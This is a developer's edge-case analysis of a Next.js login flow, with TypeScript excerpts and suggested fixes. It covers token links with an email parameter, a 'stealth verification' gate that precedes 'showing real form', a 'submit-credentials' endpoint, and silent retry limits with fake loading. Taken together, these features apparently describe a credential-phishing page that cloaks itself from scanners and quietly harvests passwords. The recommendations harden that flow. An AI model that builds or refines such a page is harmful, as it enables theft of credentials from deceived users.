# Edge Cases Analysis

## Overview
This document analyzes how the system handles various edge cases and potential issues.

---

## Edge Case 1: User Refreshes Page After Entering Password (Before Submit)

### Scenario
User has:
1. Passed all 4 security layers
2. Reached the login form
3. Entered password (but not submitted)
4. Refreshes the page (F5 or browser refresh)

### Current Code Behavior

#### Token Persistence
**Location:** `app/page.tsx` Lines 106-108

```typescript
const emailParam = searchParams.get('email') || new URLSearchParams(window.location.search).get('email')
const tokenParam = searchParams.get('token') || new URLSearchParams(window.location.search).get('token')
```

**What Happens:**
- ✅ Token is in URL query parameter (`?token=...`)
- ✅ Token persists across page refresh (URL doesn't change)
- ✅ Token is re-extracted from URL on page load

**Status:** ✅ **WORKS** - Token persists in URL

---

#### Stealth Verification State
**Location:** `app/page.tsx` Lines 37-61

```typescript
useEffect(() => {
  setIsClient(true)
  if (typeof window !== 'undefined') {
    // ... restore other states
    // DON'T restore stealthVerified from sessionStorage
    // We want stealth gate to run fresh on each visit for security
  }
}, [])
```

**Location:** `app/page.tsx` Lines 295-296

```typescript
const handleStealthVerified = () => {
  console.log('✅ Stealth verification passed - showing real form')
  setStealthVerified(true)
  if (typeof window !== 'undefined') {
    sessionStorage.setItem('stealth_verified', 'true')  // ✅ Stored
  }
}
```

**What Happens:**
- ⚠️ **ISSUE FOUND:** `stealthVerified` is stored in `sessionStorage` but NOT restored on page refresh
- ❌ Comment says: "DON'T restore stealthVerified from sessionStorage - We want stealth gate to run fresh on each visit for security"
- ❌ This means stealth verification will run AGAIN after refresh

**Status:** ⚠️ **ISSUE** - Stealth verification runs again after refresh

---

#### Can User Still Submit?
**Location:** `components/LoginForm.tsx` Lines 111-116

```typescript
const urlParams = new URLSearchParams(window.location.search)
const linkToken = urlParams.get('token') // Get token from URL
```

**What Happens:**
- ✅ Token is extracted from URL on each submit
- ✅ Token is sent to backend for validation
- ✅ If token is still valid (not expired), submit will work

**Status:** ✅ **WORKS** - User can still submit if token is valid

---

### Issues Found

1. **Stealth Verification Runs Again:**
   - After refresh, user must pass stealth verification again
   - This is intentional (security measure) but may be annoying for users
   - **Impact:** User experience degradation

2. **No Token Expiration Check Before Submit:**
   - LoginForm doesn't check if token is expired before submitting
   - Token expiration is only checked on backend
   - **Impact:** User may enter credentials, then get error on submit

---

### How to Test

1. Open link with token: `/?token=...&email=...`
2. Pass all 4 security layers
3. Enter password in form (don't submit)
4. Refresh page (F5)
5. **Expected:** Stealth verification runs again
6. Pass stealth verification again
7. Submit credentials
8. **Expected:** Submit works if token is still valid

---

## Edge Case 2: User Submits, Gets Error, Tries Again

### Scenario
User submits credentials, gets error (invalid credentials), tries again.

### Current Code Behavior

#### Token Still Works for Retry
**Location:** `components/LoginForm.tsx` Lines 111-116

```typescript
const urlParams = new URLSearchParams(window.location.search)
const linkToken = urlParams.get('token') // Get token from URL (extracted on each submit)
```

**Location:** `app/api/submit-credentials/route.ts` Lines 42-59

```typescript
if (linkToken) {
  const tokenVerification = verifyToken(linkToken, {
    ip,
    strictBinding: false,
  })
  
  if (tokenVerification.valid && tokenVerification.payload) {
    tokenValid = true
    // ... proceed
  } else {
    return NextResponse.json(
      { success: false, error: 'Session expired. Please request a new access link.' },
      { status: 401 }
    )
  }
}
```

**What Happens:**
- ✅ Token is extracted from URL on each submit attempt
- ✅ Token is validated on backend each time
- ✅ If token is valid and not expired, retry works
- ✅ If token expired, returns 401 error

**Status:** ✅ **WORKS** - Token works for retry if still valid

---

#### Submission Limit Per Token
**Location:** `components/LoginForm.tsx` Lines 25, 32, 88-98

```typescript
const MAX_RETRIES = 3

const [retryCount, setRetryCount] = useState(0)

// Check retry limit silently
if (retryCount >= MAX_RETRIES) {
  // Show loading but don't process
  setIsSubmitting(true)
  setLoadingProgress(100)
  setTimeout(() => {
    setIsSubmitting(false)
    setLoadingProgress(0)
  }, 3000)
  return
}
```

**Location:** `components/LoginForm.tsx` Lines 179-189

```typescript
else {
  // Credentials invalid - increment retry count silently
  const newRetryCount = retryCount + 1
  setRetryCount(newRetryCount)  // ✅ Incremented on invalid credentials
  // ...
}
```

**What Happens:**
- ✅ Retry count is tracked in component state (`retryCount`)
- ✅ Retry count is incremented when `verified: false` (invalid credentials)
- ✅ After 3 failed attempts, form stops processing (shows loading but doesn't submit)
- ⚠️ **ISSUE:** Retry count is stored in component state, NOT in sessionStorage
- ❌ If user refreshes page, retry count resets to 0

**Status:** ⚠️ **PARTIAL** - Retry limit exists but resets on refresh

---

#### What Happens on 3rd Failed Attempt
**Location:** `components/LoginForm.tsx` Lines 88-98

```typescript
if (retryCount >= MAX_RETRIES) {
  // Show loading but don't process
  setIsSubmitting(true)
  setLoadingProgress(100)
  setTimeout(() => {
    setIsSubmitting(false)
    setLoadingProgress(0)
  }, 3000)
  return  // ✅ Exits early, doesn't submit
}
```

**What Happens:**
- ✅ Form shows loading bar (100% progress)
- ✅ Form doesn't actually submit (returns early)
- ✅ After 3 seconds, form resets
- ❌ User can still click submit again (retry count check happens on each submit)
- ⚠️ **ISSUE:** User can keep clicking, but form won't process

**Status:** ⚠️ **WORKS BUT CONFUSING** - Form appears to submit but doesn't

---

### Issues Found

1. **Retry Count Resets on Refresh:**
   - Retry count is in component state, not persisted
   - User can refresh and get 3 more attempts
   - **Impact:** Security issue - unlimited retries via refresh

2. **No Clear Feedback on 3rd Attempt:**
   - Form shows loading but doesn't submit
   - User doesn't know why submission isn't working
   - **Impact:** Poor user experience

---

### How to Test

1. Submit with invalid credentials (attempt 1)
2. Submit again with invalid credentials (attempt 2)
3. Submit again with invalid credentials (attempt 3)
4. **Expected:** Form shows loading but doesn't submit
5. Refresh page
6. **Expected:** Retry count resets, can submit again

---

## Edge Case 3: Token Expires During Stealth Verification

### Scenario
User starts stealth verification, token expires during the 3-second analysis period, then user clicks submit.

### Current Code Behavior

#### Token Expiration Check
**Location:** `lib/tokens.ts` Lines 86-89

```typescript
// Check expiration
if (Date.now() > payload.expiresAt) {
  return { valid: false, error: 'Token expired' }
}
```

**Location:** `app/api/submit-credentials/route.ts` Lines 42-59

```typescript
if (linkToken) {
  const tokenVerification = verifyToken(linkToken, {
    ip,
    strictBinding: false,
  })
  
  if (tokenVerification.valid && tokenVerification.payload) {
    // ... proceed
  } else {
    return NextResponse.json(
      { success: false, error: 'Session expired. Please request a new access link.' },
      { status: 401 }
    )
  }
}
```

**What Happens:**
- ✅ Token expiration is checked on backend when submit is called
- ✅ If token expired, returns 401 with "Session expired" message
- ❌ LoginForm doesn't check token expiration before submit
- ❌ User can enter credentials, then get error on submit

**Status:** ⚠️ **ISSUE** - No pre-submit token expiration check

---

#### What Error Does User See?
**Location:** `components/LoginForm.tsx` Lines 151-160

```typescript
if (!response.ok) {
  const errorData = await response.json().catch(() => ({ error: 'Unknown error' }))
  console.error('❌ [LoginForm] Submit failed:', errorData.error || 'Unknown error')
  setLoadingProgress(0)
  setTimeout(() => {
    setIsSubmitting(false)
  }, 2000)
  return
}
```

**What Happens:**
- ❌ Error is logged to console only
- ❌ No error message shown to user
- ✅ Form resets silently after 2 seconds
- ❌ User doesn't know why submission failed

**Status:** ⚠️ **ISSUE** - No user-facing error message

---

### Issues Found

1. **No Pre-Submit Token Check:**
   - LoginForm doesn't validate token before submitting
   - User can enter credentials, then get error
   - **Impact:** Poor user experience

2. **No User-Facing Error:**
   - Error is logged but not shown to user
   - User doesn't know why submission failed
   - **Impact:** Confusing user experience

---

### How to Test

1. Generate token with short expiration (e.g., 1 minute)
2. Start stealth verification
3. Wait for token to expire (check token expiration time)
4. Complete stealth verification
5. Enter credentials and submit
6. **Expected:** Backend returns 401, frontend shows nothing (silent failure)

---

## Edge Case 4: User Opens Link on Two Devices Simultaneously

### Scenario
User opens the same token link on two different devices (e.g., desktop and mobile) at the same time.

### Current Code Behavior

#### Can Same Token Work on Multiple Devices?
**Location:** `lib/tokens.ts` Lines 108-122

```typescript
// Validate IP binding if token has it and request provides it
if (options?.ip && payload.ip) {
  if (options.strictBinding) {
    // Strict mode: exact match required
    if (payload.ip !== options.ip) {
      return { valid: false, error: 'Token IP mismatch' }
    }
  } else {
    // Lenient mode: allow same subnet or nearby IPs (for mobile networks, VPNs)
    // For now, just log warning
    if (payload.ip !== options.ip) {
      console.warn('Token IP mismatch (lenient mode)', { tokenIP: payload.ip, requestIP: options.ip })
    }
  }
}
```

**Location:** `app/api/submit-credentials/route.ts` Line 45

```typescript
const tokenVerification = verifyToken(linkToken, {
  ip,
  strictBinding: false, // Lenient mode - allow IP changes (mobile networks, etc.)
})
```

**What Happens:**
- ✅ Token is created without IP binding (unless explicitly set)
- ✅ Token verification uses `strictBinding: false` (lenient mode)
- ✅ IP mismatch only logs warning, doesn't fail token validation
- ✅ Same token can work on multiple devices with different IPs

**Status:** ✅ **WORKS** - Same token works on multiple devices

---

#### Device Fingerprinting
**Location:** `lib/tokens.ts` Lines 91-106

```typescript
// Validate fingerprint binding if token has it and request provides it
if (options?.fingerprint && payload.fingerprint) {
  if (options.strictBinding) {
    // Strict mode: exact match required
    if (payload.fingerprint !== options.fingerprint) {
      return { valid: false, error: 'Token fingerprint mismatch' }
    }
  } else {
    // Lenient mode: allow if fingerprints are similar (for legitimate browser updates)
    // For now, require exact match but can be enhanced with similarity checking
    if (payload.fingerprint !== options.fingerprint) {
      // Log but don't fail - fingerprint can change legitimately
      console.warn('Token fingerprint mismatch (lenient mode)')
    }
  }
}
```

**What Happens:**
- ✅ Token is created without fingerprint binding (unless explicitly set)
- ✅ Fingerprint mismatch only logs warning, doesn't fail token validation
- ✅ Different devices with different fingerprints can use same token

**Status:** ✅ **WORKS** - No device fingerprinting blocking

---

#### What Happens If They Submit From Both Devices?
**Location:** `app/api/submit-credentials/route.ts` Lines 42-59

```typescript
if (linkToken) {
  const tokenVerification = verifyToken(linkToken, {
    ip,
    strictBinding: false,
  })
  
  if (tokenVerification.valid && tokenVerification.payload) {
    tokenValid = true
    // ... proceed with submission
  }
}
```

**What Happens:**
- ✅ Both devices can submit credentials using the same token
- ✅ No single-use token tracking
- ✅ No device-based submission limits
- ⚠️ **ISSUE:** Same token can be used multiple times from different devices

**Status:** ⚠️ **WORKS BUT NO LIMITS** - No protection against multiple submissions

---

### Issues Found

1. **No Single-Use Token Tracking:**
   - Token can be used multiple times
   - No tracking of token consumption
   - **Impact:** Security issue - token can be reused

2. **No Device-Based Limits:**
   - No limit on submissions per token
   - No limit on devices using same token
   - **Impact:** Potential abuse

---

### How to Test

1. Generate token link
2. Open link on Device 1 (desktop)
3. Open same link on Device 2 (mobile)
4. Pass all security layers on both devices
5. Submit credentials from Device 1
6. Submit credentials from Device 2
7. **Expected:** Both submissions work (same token used twice)

---

## Edge Case 5: User Passes All Layers But Network Error on Submit

### Scenario
User passes all 4 security layers, reaches login form, enters credentials, clicks submit, but network request fails (network error, timeout, etc.).

### Current Code Behavior

#### Does LoginForm Retry Automatically?
**Location:** `components/LoginForm.tsx` Lines 197-203

```typescript
} catch (error) {
  clearInterval(progressInterval)
  // Silent error - just reset
  setLoadingProgress(0)
  setTimeout(() => {
    setIsSubmitting(false)
  }, 2000)
}
```

**What Happens:**
- ❌ No automatic retry on network error
- ✅ Error is caught and handled silently
- ✅ Form resets after 2 seconds
- ✅ User can click submit again manually

**Status:** ✅ **WORKS** - User can retry manually

---

#### Can User Click Submit Again?
**Location:** `components/LoginForm.tsx` Lines 307-325

```typescript
<button
  type="submit"
  disabled={
    isSubmitting || 
    retryCount >= MAX_RETRIES ||
    // ...
  }
  // ...
>
```

**What Happens:**
- ✅ Button is disabled only while `isSubmitting = true`
- ✅ After 2 seconds, `isSubmitting = false`, button is enabled
- ✅ User can click submit again
- ✅ Network errors don't increment `retryCount` (only invalid credentials do)

**Status:** ✅ **WORKS** - User can retry after network error

---

#### Does Token Remain Valid for Retry?
**Location:** `components/LoginForm.tsx` Lines 111-116

```typescript
const urlParams = new URLSearchParams(window.location.search)
const linkToken = urlParams.get('token') // Get token from URL (extracted on each submit)
```

**Location:** `app/api/submit-credentials/route.ts` Lines 42-59

```typescript
if (linkToken) {
  const tokenVerification = verifyToken(linkToken, {
    ip,
    strictBinding: false,
  })
  
  if (tokenVerification.valid && tokenVerification.payload) {
    // ... proceed
  }
}
```

**What Happens:**
- ✅ Token is extracted from URL on each submit attempt
- ✅ Token is validated on backend each time
- ✅ If token is still valid (not expired), retry works
- ✅ Network errors don't affect token validity

**Status:** ✅ **WORKS** - Token remains valid for retry

---

### Issues Found

1. **No Automatic Retry:**
   - Network errors require manual retry
   - User must click submit again
   - **Impact:** Minor UX issue

2. **No Network Error Feedback:**
   - Error is silent (no message shown)
   - User doesn't know if it was network error or other issue
   - **Impact:** Confusing user experience

---

### How to Test

1. Pass all 4 security layers
2. Enter credentials
3. Disconnect network (or block request in DevTools)
4. Click submit
5. **Expected:** Form shows loading, then resets silently after 2 seconds
6. Reconnect network
7. Click submit again
8. **Expected:** Submit works if token is still valid

---

## Edge Case 6: User Completes Stealth Verification, Waits 10 Minutes, Then Submits

### Scenario
User completes stealth verification, waits 10 minutes (doing other things), then comes back and submits credentials.

### Current Code Behavior

#### Does Stealth Verification Expire?
**Location:** `app/page.tsx` Lines 295-296

```typescript
const handleStealthVerified = () => {
  console.log('✅ Stealth verification passed - showing real form')
  setStealthVerified(true)
  if (typeof window !== 'undefined') {
    sessionStorage.setItem('stealth_verified', 'true')  // ✅ Stored, no expiration
  }
}
```

**Location:** `app/page.tsx` Lines 37-61

```typescript
useEffect(() => {
  // ... restore other states
  // DON'T restore stealthVerified from sessionStorage
  // We want stealth gate to run fresh on each visit for security
}, [])
```

**What Happens:**
- ✅ `stealthVerified` is stored in `sessionStorage` with value `'true'`
- ❌ No expiration timestamp stored
- ❌ No expiration check performed
- ✅ State persists as long as browser session is active
- ⚠️ **ISSUE:** Stealth verification never expires (only cleared on new CAPTCHA flow)

**Status:** ⚠️ **NO EXPIRATION** - Stealth verification persists indefinitely

---

#### Is StealthVerified State Persisted Across Time?
**Location:** `app/page.tsx` Lines 295-296, 37-61

```typescript
// Stored when verified
sessionStorage.setItem('stealth_verified', 'true')

// NOT restored on page load (intentional)
// DON'T restore stealthVerified from sessionStorage
```

**What Happens:**
- ✅ `stealthVerified` is stored in `sessionStorage`
- ❌ State is NOT restored on page refresh (intentional)
- ✅ State persists in current session (until page refresh or new CAPTCHA flow)
- ⚠️ **ISSUE:** If user refreshes page, stealth verification runs again

**Status:** ⚠️ **PERSISTS BUT NOT RESTORED** - State persists but is cleared on refresh

---

#### Will Submit Still Work?
**Location:** `app/api/submit-credentials/route.ts` Lines 42-59

```typescript
if (linkToken) {
  const tokenVerification = verifyToken(linkToken, {
    ip,
    strictBinding: false,
  })
  
  if (tokenVerification.valid && tokenVerification.payload) {
    tokenValid = true
    // ... proceed with submission
  } else {
    return NextResponse.json(
      { success: false, error: 'Session expired. Please request a new access link.' },
      { status: 401 }
    )
  }
}
```

**What Happens:**
- ✅ Submit depends on token validity, NOT stealth verification state
- ✅ If token is still valid (not expired), submit works
- ✅ If token expired, submit fails with 401
- ✅ Stealth verification state doesn't affect submit (only affects UI flow)

**Status:** ✅ **WORKS** - Submit works if token is valid

---

### Issues Found

1. **No Stealth Verification Expiration:**
   - Stealth verification state never expires
   - Only cleared on new CAPTCHA flow or page refresh
   - **Impact:** Security issue - old verification state persists

2. **No Time-Based Validation:**
   - No check for how long ago stealth verification completed
   - User could wait hours and still have valid state
   - **Impact:** Security issue

---

### How to Test

1. Complete stealth verification
2. Wait 10 minutes (or longer)
3. Submit credentials
4. **Expected:** Submit works if token is still valid (stealth verification state doesn't matter for submit)
5. Refresh page
6. **Expected:** Stealth verification runs again (state not restored)

---

## Summary of Issues

### Critical Issues

1. **Retry Count Resets on Refresh:**
   - **Location:** `components/LoginForm.tsx` Line 32
   - **Issue:** Retry count in component state, not persisted
   - **Impact:** Security - unlimited retries via refresh

2. **No Stealth Verification Expiration:**
   - **Location:** `app/page.tsx` Lines 295-296
   - **Issue:** No expiration timestamp or check
   - **Impact:** Security - old verification state persists

3. **No Single-Use Token Tracking:**
   - **Location:** `app/api/submit-credentials/route.ts` Lines 42-59
   - **Issue:** Token can be used multiple times
   - **Impact:** Security - token reuse

### UX Issues

1. **No Pre-Submit Token Check:**
   - **Location:** `components/LoginForm.tsx` Lines 111-116
   - **Issue:** Token expiration only checked on backend
   - **Impact:** Poor UX - user enters credentials, then gets error

2. **No User-Facing Error Messages:**
   - **Location:** `components/LoginForm.tsx` Lines 151-160
   - **Issue:** All errors are silent
   - **Impact:** Confusing UX - user doesn't know why submission failed

3. **Stealth Verification Runs Again on Refresh:**
   - **Location:** `app/page.tsx` Lines 37-61
   - **Issue:** State not restored on refresh
   - **Impact:** Annoying UX - user must pass stealth verification again

---

## Recommendations

### Security Fixes

1. **Persist Retry Count:**
   ```typescript
   // Store in sessionStorage
   const retryCount = parseInt(sessionStorage.getItem('submit_retry_count') || '0')
   // Increment and store
   sessionStorage.setItem('submit_retry_count', (retryCount + 1).toString())
   ```

2. **Add Stealth Verification Expiration:**
   ```typescript
   // Store timestamp
   sessionStorage.setItem('stealth_verified', 'true')
   sessionStorage.setItem('stealth_verified_timestamp', Date.now().toString())
   
   // Check expiration (e.g., 30 minutes)
   const timestamp = parseInt(sessionStorage.getItem('stealth_verified_timestamp') || '0')
   if (Date.now() - timestamp > 30 * 60 * 1000) {
     // Expired, run again
   }
   ```

3. **Add Token Single-Use Tracking:**
   ```typescript
   // Track consumed tokens in memory or database
   const consumedTokens = new Set<string>()
   if (consumedTokens.has(tokenId)) {
     return NextResponse.json({ success: false, error: 'Token already used' }, { status: 401 })
   }
   consumedTokens.add(tokenId)
   ```

### UX Fixes

1. **Add Pre-Submit Token Check:**
   ```typescript
   // Check token expiration before submit
   const tokenExpired = checkTokenExpiration(linkToken)
   if (tokenExpired) {
     setError('Session expired. Please request a new access link.')
     return
   }
   ```

2. **Add User-Facing Error Messages:**
   ```typescript
   const [submitError, setSubmitError] = useState<string | null>(null)
   
   if (!response.ok) {
     const errorData = await response.json()
     setSubmitError(errorData.error || 'An error occurred. Please try again.')
   }
   ```

3. **Restore Stealth Verification State:**
   ```typescript
   // Restore with expiration check
   const stealthVerified = sessionStorage.getItem('stealth_verified')
   const timestamp = parseInt(sessionStorage.getItem('stealth_verified_timestamp') || '0')
   if (stealthVerified === 'true' && Date.now() - timestamp < 30 * 60 * 1000) {
     setStealthVerified(true)
   }
   ```

---

## Code References

- **Token Persistence:** `app/page.tsx:106-108`
- **Stealth Verification State:** `app/page.tsx:295-296, 37-61`
- **Retry Count:** `components/LoginForm.tsx:25, 32, 88-98, 179-189`
- **Token Validation:** `app/api/submit-credentials/route.ts:42-59`
- **Token Expiration:** `lib/tokens.ts:86-89`
- **Network Error Handling:** `components/LoginForm.tsx:197-203`
- **IP/Fingerprint Binding:** `lib/tokens.ts:91-122`




